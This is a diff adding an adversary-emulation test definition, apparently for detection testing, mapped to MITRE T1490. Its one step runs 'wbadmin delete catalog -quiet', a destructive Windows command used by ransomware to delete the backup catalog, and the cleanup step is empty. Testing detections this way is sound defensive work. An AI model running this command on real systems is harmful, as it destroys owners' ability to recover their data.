@@ -1,0 +1,22 @@
+api_version: "2.0"
+name: Windows - wbadmin Delete Windows Backup Catalog
+description: |
+    Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,
+    "The backup catalog has been successfully deleted." will be displayed in the PowerShell session.
+uuid: 263ba6cb-ea2b-41c9-9d4e-b652dadd002c
+mitre:
+    tactics:
+        - 'TA0040: Impact'
+    techniques:
+        - 'T1490: Inhibit System Recovery'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: windows---wbadmin-delete-windows-backup-catalog
+      inline: |
+        wbadmin delete catalog -quiet
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
